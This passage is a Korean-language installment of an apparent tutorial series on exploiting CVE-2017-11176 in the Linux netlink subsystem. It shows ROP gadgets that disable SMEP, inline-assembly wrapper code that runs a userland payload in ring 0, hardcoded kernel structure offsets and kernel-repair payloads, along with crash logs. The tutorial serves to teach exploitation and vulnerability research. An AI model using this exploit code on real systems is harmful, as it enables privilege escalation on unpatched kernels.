이제 테스트를 해보고 CR4의 값을 확인해볼 시간이다!

```plaintext
[  223.425209] double fault: 0000 [#1] SMP 
[  223.425745] CPU 0 
[  223.430785] RIP: 0010:[<ffffffff8155ad78>]  [<ffffffff8155ad78>] do_page_fault+0x8/0xa0
[  223.430930] RSP: 0018:0000000020000ff8  EFLAGS: 00010002
[  223.431000] RAX: 00000000000407f0 RBX: 0000000000000001 RCX: 000000008100bb8e
[  223.431101] RDX: 00000000ffefffff RSI: 0000000000000010 RDI: 0000000020001028
[  223.431181] RBP: 0000000020001018 R08: 0000000000000000 R09: 00007f4754a57700
[  223.431279] R10: 00007ffdc1b6e590 R11: 0000000000000206 R12: 0000000000000001
[  223.431379] R13: ffff88001c9c0ab8 R14: 0000000000000000 R15: 0000000000000000
[  223.431460] FS:  00007f4755221700(0000) GS:ffff880003200000(0000) knlGS:0000000000000000
[  223.431565] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  223.431638] CR2: 0000000020000fe8 CR3: 000000001a5d8000 CR4: 00000000000407f0
                                                                          ^--- !!!!!
```

**오우 예아!!!! SMEP가 비활성화됐다!** 이제 유저 영역 코드로 점프할 수 있다 🤣!

### Jumping to Payload's Wrapper

왜 유저 영역 함수를 바로 호출하지 않고 "wrapper로 점프"를 하는지 궁금할 것이다. 여기엔 3가지 이유가 있다.

첫 번째로, GCC는 "non-scratch" 레지스터를 저장/복구하기 위해 C 함수의 시작과 끝 부분에 자동으로 "프롤로그"와 "에필로그"를 설치(setup)한다. 우린 이 행동을 바꿀 수 있는 *\_\_attribute\_\_()* 매크로에 대해 알지 못한다. 그것 또한 리턴하기 전에 "leave" 인스트럭션을 가지고 있다. 이 때문에 스택이 수정될 것이다.

문제는 스택이 현재 유저 영역의 스택이라는 것이다. 그러나 이를 페이로드 내에서 고치면 다시 커널 스택이 될 것이다. 즉 유저 영역 스택에 push한 데이터를 커널 스택에서 pop한다. 이렇게 하면 스택이 *mis-align*되어 거의 커널 크래시로 이어질 것이다.

두 번째로, 페이로드를 호출하기 전에 **스택 포인터를 커널 스레드 스택으로 복구하고** 싶다. 다시 말해 페이로드가 여느 커널 코드처럼 (스택에 따라) 실행되길 바란다. 유일한 차이점은 코드가 유저 영역에 있다는 것이다.

이제 유저 영역 코드에 접근할 수 있으므로 ROP 체인 대신 **inline assembly**를 사용할 것이다. 즉 마지막 *ret* 인스트럭션이 (wrapper에서) 실행되면 커널은 **curr->func()** arbitrary call primitive(= *\_\_wake\_up\_common()* 안에서) 이후에 "평범한"(normal) 실행을 이어갈 수 있다.

세 번째로, 최종 페이로드가 arbitrary call 요구 조건을 "모르게"(agnostic)하는 "추상화"(abstraction)을 원한다. arbitrary call primitive를 사용하여 ***break*에 도달하려면** 호출된 함수가 **NULL이 아닌 값을 반환해야**한다. 이것을 wrapper에서 할 것이다.

그러기 위해 다음 가젯들을 사용한다:

```asm
0xffffffff81004abc : pop rcx ; ret
0xffffffff8103357c : jmp rcx
```

jump ROP-chain은 다음과 같아진다:

```c
#define POP_RCX_ADDR              ((uint64_t) 0xffffffff81004abc)
#define JMP_RCX_ADDR              ((uint64_t) 0xffffffff8103357c)

#define JUMP_TO(addr) \
  *stack++ = POP_RCX_ADDR; \
  *stack++ = (uint64_t) addr; \
  *stack++ = JMP_RCX_ADDR;
```

이는 다음을 통해 실행된다:

```c
static void build_rop_chain(uint64_t *stack)
{
  memset((void*)stack, 0xaa, 4096);

  SAVE_ESP(&saved_esp);
  SAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);
  DISABLE_SMEP();
  JUMP_TO(&userland_entry);
}
```

wrapper에 대한 "stub"은 다음과 같다:

```c
extern void userland_entry(void); // make GCC happy

static __attribute__((unused)) void wrapper(void) 
{
  // avoid the prologue
  __asm__ volatile( "userland_entry:" :: );   // <----- jump here

  // FIXME: repair the stack
  // FIXME: call to "real" payload

  // avoid the epilogue and the "leave" instruction
  __asm__ volatile( "ret" :: );
}
```

*userland\_entry*를 *external*로 선언해야 한다는 점에 주목하자. external로 선언하면 wrapper 맨 위에 있는 label을 가리키고, 그렇지 않으면 GCC가 불평할 것이다. 그리고 몇 몇 컴파일 경고를 피하기 위해 *wrapper()* 함수를 *\_\_attribute\_\_((unused))*로 마킹한다.

### Restoring the Stack Pointers and Wrapper Finalization

ROP-chain 도중에 스택 포인터를 저장해 놨으므로 복구하는 것은 간단한 일이다. 우리가 RSP의 "최하위 32비트"만 저장했다는 점에 주목하자. 다행히도 우린 "RBP"도 저장해두었다. *\_\_wake\_up\_common()*의 **stack frame**의 크기가 4기가가 아니라면 RSP "최상위 32비트"는 RBP의 것과 같다. 이게 우리가 다음을 통해 둘 다 복구할 수 있는 이유이다:

```c
restored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);
restored_rsp = ((saved_rbp_hi << 32) | saved_esp);
```

이전 섹션에서 언급한 것처럼 0이 아닌 값을 반환하려면 arbitrary call primitive도 필요하다. wrapper는 다음과 같아진다:

```c
static volatile uint64_t restored_rbp;
static volatile uint64_t restored_rsp;

static __attribute__((unused)) void wrapper(void) 
{
  // avoid the prologue
  __asm__ volatile( "userland_entry:" :: );

  // reconstruct original rbp/rsp
  restored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);
  restored_rsp = ((saved_rbp_hi << 32) | saved_esp);

  __asm__ volatile( "movq %0, %%rax\n"
                    "movq %%rax, %%rbp\n"
                    :: "m"(restored_rbp)  );

  __asm__ volatile( "movq %0, %%rax\n"  
                    "movq %%rax, %%rsp\n"
                    :: "m"(restored_rsp)  );

  // FIXME: call to "real" payload

  // arbitrary call primitive requires a non-null return value (i.e. non zero RAX register)
  __asm__ volatile( "movq $5555, %%rax\n"
                    :: );

  // avoid the epilogue and the "leave" instruction
  __asm__ volatile( "ret" :: );
}
```

*ret* 인스트럭션이 실행되면 커널 스레드 스택 포인터와 *RBP*가 복구된다. 게다가 *RAX*는 0이 아닌 값을 가진다. 즉 우리는 *curr->func()*로부터 리턴할 것이고 **커널은 "평범한"(normal) 실행을 이어갈 것이다**.

모든 것이 잘 됐는지 확인하기 위해 *main()* 코드를 수정한다:

```c
int main(void)
{
  // ... cut ...

  // trigger the arbitrary call primitive
  printf("[ ] invoking arbitray call primitive...\n");
  val = 3535; // need to be different than zero
  if (_setsockopt(unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
  {
    perror("[-] setsockopt");
    goto fail;
  }
  printf("[+] arbitrary call succeed!\n");

  PRESS_KEY();

  // ... cut ...
}
```

실행하면 다음과 같은 결과가 나와야 한다:

```plaintext
...
[+] reallocation succeed! Have fun :-)
[ ] invoking arbitray call primitive...
[+] arbitrary call succeed!
[ ] press key to continue...

<<< KERNEL CRASH HERE >>>
```

### Calling the Payload

wrapper를 마무리짓기 위해 페이로드를 호출해보자. 오직 디버깅을 위해서, 지금은 *panic()*을 호출해보자:

```c
// kernel function symbols
#define PANIC_ADDR ((void*) 0xffffffff81553684)

typedef void (*panic)(const char *fmt, ...);

static void payload(void)
{
  ((panic)(PANIC_ADDR))("HELLO FROM USERLAND");  // called from kernel land
}
```

*wrapper()* 함수를 수정한다:

```c
static __attribute__((unused)) void wrapper(void) 
{
  // avoid the prologue
  __asm__ volatile( "userland_entry:" :: );

  // reconstruct original rbp/rsp
  restored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);
  restored_rsp = ((saved_rbp_hi << 32) | saved_esp);

  __asm__ volatile( "movq %0, %%rax\n"
                    "movq %%rax, %%rbp\n"
                    :: "m"(restored_rbp)  );

  __asm__ volatile( "movq %0, %%rax\n"  
                    "movq %%rax, %%rsp\n"
                    :: "m"(restored_rsp)  );

  uint64_t ptr = (uint64_t) &payload;           // <----- HERE
  __asm__ volatile( "movq %0, %%rax\n"
                    "call *%%rax\n"
                    :: "m"(ptr) );

  // arbitrary call primitive requires a non-null return value (i.e. non zero RAX register)
  __asm__ volatile( "movq $5555, %%rax\n"
                    :: );

  // avoid the epilogue and the "leave" instruction
  __asm__ volatile( "ret" :: );
}
```

이제 익스플로잇을 실행하면 다음과 같은 trace를 얻는다:

```plaintext
[ 1394.774972] Kernel panic - not syncing: HELLO FROM USERLAND      // <-----
[ 1394.775078] Pid: 2522, comm: exploit 
[ 1394.775200] Call Trace:
[ 1394.775342]  [<ffffffff8155372b>] ? panic+0xa7/0x179
[ 1394.775465]  [<ffffffff81553684>] ? panic+0x0/0x179              // <-----
[ 1394.775583]  [<ffffffff81061909>] ? __wake_up_common+0x59/0x90   // <-----
[ 1394.775749]  [<ffffffff810665a8>] ? __wake_up+0x48/0x70
[ 1394.775859]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c/0x1c0
[ 1394.776022]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f/0xc0
[ 1394.776167]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16/0x1b
```

훌륭하다! 커널 스택 포인터(스레드 스택)와 스택 프레임 포인터를 둘 다 복구했으므로 **"clean"한 call trace를 얻었다.** 게다가, "HELLO FROM USERLAND" 메시지를 본다는 것은 우리가 확실히 커널 실행 흐름을 제어하고 있다는 것이다. 다시 말해 **우린 Ring-0에서 임의의 코드를 실행했고** 페이로드를 C언어로 작성할 수 있다(ROP는 더이상 필요 없음).

익스플로잇을 끝마치기까지 두 가지가 남았다:

1. 커널을 보수한다(필수적)
2. Fun & Profit (부가적)

- - -

## Repair the Kernel

"*어제 내일 한다고 했으면... 지금 당장 하라!*"

이전 섹션에서 성공적으로 arbitrary call primitive를 익스플로잇하여 ring-0에서 완전한 arbitrary code 실행하여, 최종 페이로드를 C로 작성할 수 있게 되었다(?). 이번 섹션에서 커널 보수에 arbitrary call primitive(?)를 사용할 것이다. **익스플로잇이 종료될 때 커널 크래시가 발생하기 때문에 이 단계는 필수적인 단계이다.**

[part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 언급한 것처럼, **익스플로잇에 소개된 모든 *dangling pointer*를 fix해야 한다**. 다행히도 이전 파트에서 dangling pointer들을 열거했었다:

* *unblock\_fd* file descriptor에 연관된 *struct socket*에 있는 **sk** 포인터
* *nl\_table*의 해시 리스트에 있는 포인터들

### Fixing the *struct socket*

"Core Concepts #1" ([part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca) 참고)에서 file descriptor 그리고 그와 연관된 ("특수한") file간의 관계에 대해 소개했다:

![Core Structure Relationship](https://blog.lexfo.fr/images/cve-2017-11176-linux/core_struct_relationship.png)

여기서 고쳐야 하는 것은 *struct socket*과 *struct sock*(= **sk** 필드) 사이의 포인터이다.

*netlink\_release()*의 UAF 때문에 종료 도중에 크래시가 발생했던 게 기억나는가?

```c
static int netlink_release(struct socket *sock)
{
    struct sock *sk = sock->sk;
    struct netlink_sock *nlk;

    if (!sk)
        return 0;                 // <----- hit this!

    netlink_remove(sk);

  // ... cut ...
```

볼 수 있듯이 *sk*가 NULL이면 모든 코드를 통과한다. 다시 말해 파손된(broken) *struct socket*은 다음을 통해 고칠 수 있다:

```c
current->files->fdt->fd[unblock_fd]->private_data->sk = NULL;

                                                   ^ struct socket
                                     ^ struct file
                      ^ struct file **
                ^ struct files_struct
          ^ struct task_struct
^--- struct task_struct *
```

**노트**: 여기선 *unblock\_fd*를 사용하는데 이는 다른 file descriptor들이 익스플로잇 도중에 close되기 때문이다. arbitrary call primitive를 실행할 때도 같은 fd를 사용한다.

즉 다음이 필요하다:

1. *현재* 포인터의 값
2. 앞서 언급한 모든 구조체의 오프셋

커널이 "정상적인"(normal) housekeeping (레퍼런스 카운터 감소시키기, 오브젝트 해제하기 등)을 하도록 둔 채로 이 포인터만을 재설정하는 것이 중요하다. **메모리 leak을 방지해준다!**

예를 들어 SystemTap으로 했던 것처럼 fdt 항목을 NULL로 만들 순 있지만 이렇게 하면 *file, 소켓, inode*와 잠재적으로 다른 오브젝트에까지 메모리 leak이 발생시킬 것이다.

[part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 커널 구조체를 "모방하는" 방법을 배웠다. 그러나 이들은 큰 구조체이다(특히 *task\_struct*와 *file*). 때문에 살짝 귀찮아진 우리는 *하드코딩된 오프셋*을 사용하여 필요한 필드만 정의한다:

```c
#define TASK_STRUCT_FILES_OFFSET (0x770) // [include/linux/sched.h]
#define FILES_STRUCT_FDT_OFFSET (0x8) // [include/linux/fdtable.h]
#define FDT_FD_OFFSET (0x8) // [include/linux/fdtable.h]
#define FILE_STRUCT_PRIVATE_DATA_OFFSET (0xa8)
#define SOCKET_SK_OFFSET (0x38)

struct socket {
  char pad[SOCKET_SK_OFFSET];
  void *sk;
};

struct file {
  char pad[FILE_STRUCT_PRIVATE_DATA_OFFSET];
  void *private_data;
};

struct fdtable {
  char pad[FDT_FD_OFFSET];
  struct file **fd;
};

struct files_struct {
  char pad[FILES_STRUCT_FDT_OFFSET];
  struct fdtable *fdt;
};

struct task_struct {
  char pad[TASK_STRUCT_FILES_OFFSET];
  struct files_struct *files;
};
```

**노트**: 디스어셈블리에서 오프셋을 추출하는 방법을 part 3에서 배운 바 있다. 특정 필드를 역참조하는 코드를 찾고 사용된 오프셋을 기록하라.

보수하는 페이로드를 작성하기 전에 한 가지가 빠졌다. **현재** 포인터 값이다. "Core Concepts #4"를 보면 커널이 현재 포인터 값을 얻기 위해 *thread\_info* 구조체의 *task* 필드를 사용한다는 것을 알 수 있다.

게다가 우린 아무 커널 스레드 스택 포인터나 마킹해서 *thread\_info*를 얻을 수 있는 걸 알고 있다. 우리가 *RSP*를 저장, 복구했기 때문에 후자(the latter)가 있다(?). 즉 다음 매크로를 사용할 것이다:

```c
struct thread_info {
    struct task_struct  *task;
  char pad[0];
};

#define THREAD_SIZE (4096 << 2)

#define get_thread_info(thread_stack_ptr) \
  ((struct thread_info*) (thread_stack_ptr & ~(THREAD_SIZE - 1)))

#define get_current(thread_stack_ptr) \
  ((struct task_struct*) (get_thread_info(thread_stack_ptr)->task))
```

*payload()* 함수는 최종적으로 다음과 같아진다:

```c
static void payload(void)
{
  struct task_struct *current = get_current(restored_rsp);
  struct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;
  void *sk;

  sk = sock->sk; // keep it for later use
  sock->sk = NULL; // fix the 'sk' dangling pointer
}
```

"평범한" 커널 코드같이 보이지 않는가?

그럼 이제 익스플로잇을 실행해보자:

```bash
$ ./exploit
...
[ ] invoking arbitrary call primitive...
[+] arbitrary call succeed!
[+] exploit complete!
$                                           // <----- no crash!
```

**완벽하다. 종료될 때까지 커널에 크래시가 나지 않았다!** 하지만 아직 끝난 것이 아니다!

이제 이 명령어를 입력해보자:

```bash
$ cat /proc/net/netlink
<<< KERNEL CRASH >>>
```

```plaintext
[ 1392.097743] BUG: unable to handle kernel NULL pointer dereference at 0000000000000438
[ 1392.137715] IP: [<ffffffff814b70e8>] netlink_seq_next+0xe8/0x120
[ 1392.148010] PGD 1cc62067 PUD 1b2df067 PMD 0 
[ 1392.148240] Oops: 0000 [#1] SMP 
...
[ 1393.022706]  [<ffffffff8155adae>] ? do_page_fault+0x3e/0xa0
[ 1393.023509]  [<ffffffff81558055>] ? page_fault+0x25/0x30
[ 1393.024298]  [<ffffffff814b70e8>] ? netlink_seq_next+0xe8/0x120        // <---- the culprit
[ 1393.024914]  [<ffffffff811e8e7b>] ? seq_read+0x26b/0x410
[ 1393.025574]  [<ffffffff812325ae>] ? proc_reg_read+0x7e/0xc0
[ 1393.026268]  [<ffffffff811c0a65>] ? vfs_read+0xb5/0x1a0
[ 1393.026920]  [<ffffffff811c1d86>] ? fget_light_pos+0x16/0x50
[ 1393.027665]  [<ffffffff811c0e61>] ? sys_read+0x51/0xb0
[ 1393.028446]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16/0x1b
```

아이고🤦‍♀️ NULL 포인터가 역참조되었다. 그렇다. **아직 모든 dangling pointer를 고치지 않았기 때문에** 커널이 아직 *불안정한* 상태인 것이다. 다시 말해 익스플로잇이 종료될 때까진 크래시가 나지 않았지만, **시한 폭탄을 안고 있는 셈이다**. 다음 섹션은 이에 대한 내용이다.

### Fixing the nl\_table hash list

hash list를 고치는 것은 보기보다 까다로운데 이는 두 가지 문제가 있기 때문이다:

* *hlist\_head* 타입이 하나의 "first" 포인터(= circular가 아니다)를 사용한다
* 요소들이 여러 bucket에 저장되어 "adjacency"가 tedious하게 만든다

게다가 Netlink는 삽입 도중에 (일을 복잡하게 만드는) "dilution" 메커니즘을 사용하도록 구현되었다. 어떻게 고쳐야 할지 보자!

**노트**: Netlink는 *pid*로부터 빠르게 *struct sock*을 얻기 위해 해시 테이블을 사용한다(*netlink\_lookup()* 참고). *netlink\_unicast()*가 호출한 *netlink\_getsockbypid()*로부터 용례(usage)를 한번 본 적이 있다(part 2 참고). 

#### Fixing a Corrupted List

이번 섹션에서 손상된(corrupted) 이중 연결 리스트를 일반적으로 어떻게 고치는지 볼 것이다. 이 지점에선 이미 arbitrary code execution이 있다고 가정한다(따라서 arbitrary read/write도 있다).

정상 리스트는 이렇게 생겼다:

![Normal List](https://blog.lexfo.fr/images/cve-2017-11176-linux/list_normal.png)

이제 우리가 중간에 있는 요소를 free하고 재할당한다고 가정해보자. 원래의 "next" 포인터와 "prev" 포인터를 모르므로 리스트가 손상된다. 게다가 인접한 요소들은 dangling pointer를 가지고 있다:

![List After Reallocation](https://blog.lexfo.fr/images/cve-2017-11176-linux/list_after_realloc.png)

이런 리스트에선 역참조가 일어나(고 거의 크래시가 나)기 때문에 할 수 없는 operation(순회 등)이 여럿 있다.

여기서 여러 가지를 해볼 수 있다. 먼저 재할당된 요소의 next/prev 포인터를 고쳐 원래의 리스트처럼 보이게 만들 수 있다. 아니면 재할당한 요소가 리스트에서 나오게(= 인접한 요소들이 서로를 가리키게) 만들 수 있다:

![List Jump Over](https://blog.lexfo.fr/images/cve-2017-11176-linux/list_jump_over.png)

두 선택 모두 우리가 인접한 요소의 주소를 안다고 가정한다. 그럼 이제 (arbitrary read를 통해서도) 인접한 요소의 주소를 모른다고 가정해보자. 그럼 망한 걸까? 아니다!

이 발상은 우리가 *제어하는* 재할당 요소의 앞뒤로 "guard" 요소를 사용하는 것이다. 재할당 이후에도 dangling pointer를 가지고 있을 수 있으므로, **그것들을 제거하는 것이 어떤 주소도 모른 채로 재할당 요소를 실제로 "fix up"하는 것이 된다**(*list\_del()* 코드를 보면 수긍이 될 것이다):

![List Removing Guard](https://blog.lexfo.fr/images/cve-2017-11176-linux/list_guard_del.png)

물론 이제 고전적인 *list\_del()*을 재할당 요소에 사용하여 fix한 리스트에서 재할당 요소를 완전히 지워낼 수 있다.

즉 이 테크닉에 두 가지 제약이 있다:

1. 하나 혹은 두 개의 인접한 "guard" 요소를 만든다(setup)
2. *마음대로* guard를 리스트에서 제거할 수 있다

다음 섹션에서 볼 수 있듯이 우리 맥락에 1)이 있으면 (해시 함수와 "dilute" 메커니즘 때문에) 좀 까다로워진다. 익스플로잇에선 "혼합된" 접근 방법을 사용할 것이다(쭉 보자).

#### Lost in Space

Core Concepts #4의 Netlink 구조체와 그에 연관된 알고리즘에 대한 섹션을 읽지 않았다면 돌아가서 읽을 시간이다.

*nl\_table*의 해시 리스트에 있는 (우리가 고칠 필요가 있는) dangling pointer들을 찾아보자.

재할당 이후 "가짜 *netlink\_sock*의 *next*와 *pprev* 필드는 쓰레기 값을 가지고 있다. 게다가 bucket의 "원래" 이전 그리고/혹은 다음 요소는 dangling pointer를 가지고 있다.

**손상된 해시 리스트를 보수하기 위해 사용할 전략은 재할당된 요소의 *next/pprev* 값을복구하고 *\_\_hlist\_del()* operation을 사용하여 dangling pointer를 고치는 것이다.**

그러나...

![Corrupted nl\_table](https://blog.lexfo.fr/images/cve-2017-11176-linux/nl_table_dangling.png)

그렇다, 우리의 재할당을 계승한(succeeding) 요소가 "길을 잃었다". 이게 대체 무엇을 의미하는가? **어떤 것도 그 요소를 가리키지 않는다는 뜻이다**. 존재하던 "유일한 연결고리"는 재할당에 의해 덮어쓰였다. 그러나 요소의 *pprev* 포인터를 복구해야 한다! 이게 다 **해시 리스트가 원형이 아니기 때문이다.** 힘든 일이다.

문제로 돌아가기 전에 가짜 *netlink\_sock*의 "*pprev*"를 해결해보자. 그리 어렵지 않다:

1. *nl\_table* (exported symbol)의 *NELTINK\_USERSOCK* 해시 테이블을 찾는다.
2. **원래의** *pid*(*MAGIC\_NL\_PID* 아님)와 해시 테이블의 *rnd* 값을 사용하여 **해시 함수를 반복(replay)하고** 맞는 bucket을 찾는다.
3. 이전 요소의 주소를 저장하며 재할당 요소를 찾아 **bucket 리스트를 순회한다**.
4. "pprev" 값을 고친다

3)이 우리가 재할당된 요소의 주소를 알고 있다고 가정한다는 점에 주목하자. 실제로도 그렇다! *socket* 구조체의 **sk** 필드에 들어있다. **게다가 *next* 포인터(*hlist\_node*)는  *netlink\_sock*의 맨 처음 필드이다**. 다시 말해 sk와 주소가 같다. 이것이 NULL로 덮어씌우기 전에 그것을 저장해둔 이유이다(Fixing the *struct socket* 참고).

**주의**: 2)는 해시 테이블이 dilute되지 않았다고 가정한다. 위험을 취소화하는 방법을 보게 될 것이다.

문제 하나 고치기 완료!

#### We Need A Friend: Information Leak

이전 섹션에서 bucket 리스트를 순회하는 방법을 통해 재할당된 요소의 *pprev*포인터를 고칠수 있다는 것을 알았다. 이제 *\_\_hlist\_del()*이 호출되기 전에 *next* 포인터를 복구해야 한다. 그러나 "next" 요소에 대한 유일한 연결고리가 재할당 과정에서 덮어쓰였기 때문에 어디서 그걸 할 수 있을지 모른다. 그럼 뭘 할 수 있는가?

최악의 경우에도 **메모리 전체를 스캔하여** 모든 *netlink\_sock* 오브젝트를 얻는 방법이 있다. SLAB은 계속 partial/full slab을 추적하고 있다. 즉 kmalloc-1024 slab들을 스캔하여 그 오브젝트들이 *NETLINK\_USERSOCK* 프로토콜을 사용하는 *netlink\_sock* 타입(예: *private\_data->sock->ops == &netlink\_ops*)의 (*f\_ops* 필드를 가진) 소켓인지 등을 확인해볼 수 있다. 그리고 이들 오브젝트 중 *pprev* 필드가 재할당 요소를 가리키고 있는지 체크한다. 가능한 방법이지만, 메모리를 스캔하는 데 시간이 너무 많이 든다.  하지만 가끔은 (익스플로잇에 따라) 그것이 커널을 fix하는 유일한 방법이기도 하다는 것을 기억하자!

**노트**: SLUB을 사용하는 시스템에선 "full" slab들을 추적하지 않으므로 일이 더 어려울 수 있다. *struct page*를 파싱하는 등의 방법을 써야 그것들을 얻을 수 있을 것이다.

대신에 우리가 시도해볼 것은 **그냥 재할당 요소의 뒤에 위치한 "guard" 요소를 설치하는(setup) 것이다**. 즉 (재할당한 요소로 했던 것처럼) *file descriptor table*을 도움으로 주소를 얻는 것이다.

*그리* 쉽지는 않다:

1. 해시 함수 때문에 요소가 어떤 bucket으로 갈지 예측할 수 없다
2. 요소들이 bucket 리스트의 head에 삽입된다(= "뒤"(after)에는 놓을 수 없다)

2) 때문에 guard 요소는 우리의 타겟이자 재할당된 요소의 **앞에** 삽입되어야 한다. 그럼 1)은 어떻게 해결하는가?

해시 함수에 "역함수가 있을까"? 그렇지는 않을 것이다. 해시 함수가 *pid*와 *hash->rnd* 값을 사용한다는 점을 기억해보자. *hash->rnd* 값은 버그를 익스플로잇하기 **전에는** 알 수 없는 값이다.

**해결책은 (spraying과 비슷하게) 그냥 netlink\_socket을 잔뜩 생성하는 것이다. 그럼 우리 소켓 중 두 개가 bucket 리스트에서 인접할 가능성이 있다**. 그럼 그걸 어떻게 감지하는가?

이렇게 뭔가를 놓친 상황에선 친구가 필요하다. 그 친구는 바로 **information leak**이다.

리눅스 커널엔 다양한 종류의 많은 information leak이 있다. 몇몇은 버그로부터 나오고 몇몇은 "정상이다"(legitimate). 우린 후자를 사용할 것이다. 특히 information leak으로 가득찬 곳이 있다. 바로 ***proc* flle system**이다.

**노트**: *proc fs*는 메모리에만 존재하는 유사(pseudo) file system이며 커널로부터 정보를 얻고 혹은 시스템 전체(system-wide)의 설정을 정하는 데 사용된다. 이를 다루기 위해 사용되는 API는 **seq\_file**이다. 더 잘 이해하기 위해 [SeqFileHowTo](https://kernelnewbies.org/Documents/SeqFileHowTo)를 읽자.

#### ProcFS to The Resque!

더 구체적으로 , 우린 (글을 쓰는 시점엔) 여전히 world-readable한 **/proc/net/netlink**를 사용할 것이다. 앞서 언급한 proc fs file이 여기서 생성된다:

```c
static int __net_init netlink_net_init(struct net *net)
{
#ifdef CONFIG_PROC_FS
    if (!proc_net_fops_create(net, "netlink", 0, &netlink_seq_fops))
        return -ENOMEM;
#endif
    return 0;
}
```

그리고 다음 콜백을 사용한다:

```c
static const struct seq_operations netlink_seq_ops = {
    .start  = netlink_seq_start,
    .next   = netlink_seq_next,   // <----- this
    .stop   = netlink_seq_stop,
    .show   = netlink_seq_show,   // <----- this
};
```

보통의 결과는 이렇다:

```bash
$ cat /proc/net/netlink 
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
ffff88001eb47800 0   0      00000000 0        0        (null) 2        0       
ffff88001fa66800 6   0      00000000 0        0        (null) 2        0       
...
```

와! 심지어 **커널 포인터까지 leak한다**! 각 줄은 *netlink\_seq\_show()*에 의해 출력된다:

```c
static int netlink_seq_show(struct seq_file *seq, void *v)
{
    if (v == SEQ_START_TOKEN)
        seq_puts(seq,
             "sk       Eth Pid    Groups   "
             "Rmem     Wmem     Dump     Locks     Drops\n");
    else {
        struct sock *s = v;
        struct netlink_sock *nlk = nlk_sk(s);

        seq_printf(seq, "%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\n", // <----- VULNERABILITY (patched)
               s,
               s->sk_protocol,
               nlk->pid,
               nlk->groups ? (u32)nlk->groups[0] : 0,
               sk_rmem_alloc_get(s),
               sk_wmem_alloc_get(s),
               nlk->cb,
               atomic_read(&s->sk_refcnt),
               atomic_read(&s->sk_drops)
            );

    }
    return 0;
}
```

*seq\_printf()*의 포맷 스트링은 sock의 주소를 dump하기 위해 **%pK** 대신 **%p**를 사용한다. 이 취약점이 이미 [kptr\_restrict](https://lwn.net/Articles/420403/) 덕분에 고쳐졌다는 점을 기억하자. "K" modifier로 인해 일반 유저에게 출력되는 주소는 *000000000000000*일 것이다. **이 경우라고 가정해보자**. 이 file로 뭘 더 얻을 수 있을까?

출력될 다음 *netlink\_sock*을 선택하는 *netlink\_seq\_next()*를 살펴보자:

```c
static void *netlink_seq_next(struct seq_file *seq, void *v, loff_t *pos)
{
    struct sock *s;
    struct nl_seq_iter *iter;
    int i, j;

  // ... cut ...

    do {
        struct nl_pid_hash *hash = &nl_table[i].hash;

        for (; j <= hash->mask; j++) {
            s = sk_head(&hash->table[j]);
            while (s && sock_net(s) != seq_file_net(seq))
                s = sk_next(s);                         // <----- NULL-deref'ed here ("cat /proc/net/netlink")
            if (s) {
                iter->link = i;
                iter->hash_idx = j;
                return s;
            }
        }

        j = 0;
    } while (++i < MAX_LINKS);

  // ... cut ...
}
```

모든 해시 테이블을 0부터 *MAX\_LINKS*까지 순회한다. 그리고 각 테이블에 대하여 모든 bucket을 0부터 *hash->mask*까지 순회한다. 그리고 마침내 모든 bucket에 대해 첫 요소부터 마지막 요소까지 순회한다.

다시 말해 **요소를 "순서대로" 출력하는 것이다**. 다가오는 게 보이는가? 🙂

### The Solution

netlink socket을 많이 생성했다고 가정해보자. *procfs* file을 스캔하여 우리의 netlink socket 중 둘이 "인접했는지"를 알 수 있다. 이게 우리에게 필요한 information leak이다!

**조심하자! netlink socket 둘이 연이어 출력됐다고 해서 실제로 인접한 것은 아니다.**

여기엔 두 가지 의미가 있다:

1. 인접하거나
2. 첫 요소가 한 bucket의 마지막 요소이고 두 번째 요소가 다른 bucket의 첫 요소이다

**노트**: 이 문서의 뒷부분에선 첫 요소를 **타겟**요소, 두 번째 요소를 **guard** 요소라고 부를 것이다.

만약 첫 번째 경우라면 guard 요소를 제거하여 타겟의 *next* 필드를 고칠(fix up) 수 있다(Fixing a Corrupted List 참고). 두 번째 경우엔 guard를 제거해도 타겟에 아무 영향이 없다.

우린 해시 리스트의 마지막 요소에 대해 뭘 알고 있는가? next 포인터가 NULL이라는 것이다. 즉 재할당 도중에 타겟의 *next* 포인터 값을 NULL로 설정할 수 있다. 두 번째 경우라면 *next* 포인터가 "이미" fix되어 있을 것이다. 하지만 그걸 아는가?

***next* 포인터는 *netlink\_sock* 필드의 첫 번째 포인터이며 재할당 primitive로 제어하지 않는 유일한 필드이다...** 이 경우엔 1024인 *cmsg\_len*과 일치한다(?). ([part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197) 참고)

(*next* 포인터를 역참조하여) bucket 리스트를 순회할 때, 마지막 요소의 *next* 필드가 *NULL*일 것으로 예상된다. 그러나 우리의 경우엔 1024이다. 즉 커널이 역참조를 시도하지만 ***mmap\_min\_addr* 제한 아래의 값을 역참조하면 NULL-deref가 발생한다**. 이것이 "cat /proc/net/netlink"에서 크래시가 난 이유이다.

**노트**: */proc/sys/vm/mmap_min_addr*을 가지고 (0x10000과 비슷한 느낌으로) 이 값을 얻을 수 있다.

여기서 (일부러) 크래시를 발생시켰지만 **이 크래시는 타겟의 bucket 리스트를 순회할 때마다 발생할 수 있다**. 특히 *NETLINK\_USERSOCK*을 이용하는 다른 프로그램이 우리의 bucket 리스트의 있는 요소를 삽입하여(= 충돌) 크래시를 일으킬 수도 있다. 모든 bucket 리스트가 순회되고 모든 요소를 재삽입하기 위해 "dilution"이 발생되면 상황이 더 안 좋아진다. 무조건 고쳐야 한다!

사실 이것은 꽤 간단하다. 첫 번째 시나리오라면 커널 보수 과정에서 재할당 요소의 *next* 포인터를 NULL로 설정하기만 하면 된다.

